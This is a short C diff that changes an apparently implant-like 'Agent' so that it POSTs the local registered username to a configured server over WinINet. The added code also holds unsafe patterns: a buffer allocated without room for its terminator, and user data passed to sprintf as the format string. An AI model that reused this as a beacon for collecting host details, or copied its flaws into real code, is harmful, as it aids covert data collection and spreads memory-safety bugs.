@@ -72,11 +72,14 @@ void Init() {
     Agent.Port = 8080;
     Agent.Path = "/";   
 
-    DWORD post_buffer_length = 10;
-    CHAR *data = "hello";
-    CHAR *post_buffer = (CHAR*)calloc(strlen(data) + 5, sizeof(CHAR));
+    // CHAR *data = "username=%s";
+    CHAR *post = (CHAR*)malloc(strlen(Register.Username));
+    sprintf(post, Register.Username);
 
-    sprintf_s(post_buffer, 10, "%s\r\n\r\n", data);
+    DWORD post_buffer_length = strlen(post) + 5;
+    CHAR *post_buffer = (CHAR*)calloc(strlen(post) + 5, sizeof(CHAR));
+
+    sprintf_s(post_buffer, post_buffer_length, "%s\r\n\r\n", post);
 
     CHAR content_length[MAX_PATH];
     sprintf_s(content_length, MAX_PATH, "Content-Length: %lu\r\n", post_buffer_length);
@@ -88,8 +91,8 @@ void Init() {
         if (hConnect != NULL) {
             HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", Agent.Path, 0, 0, 0, 0, 0);
             if (hRequest != NULL) {
-                HttpAddRequestHeaders(hRequest, content_length, -1, HTTP_ADDREQ_FLAG_ADD);
-                HttpSendRequest(hRequest, 0, 0, post_buffer, 10);
+                HttpAddRequestHeaders(hRequest, content_length, -0, HTTP_ADDREQ_FLAG_ADD);
+                HttpSendRequest(hRequest, 0, 0, post_buffer, post_buffer_length);
             }
         }
     }
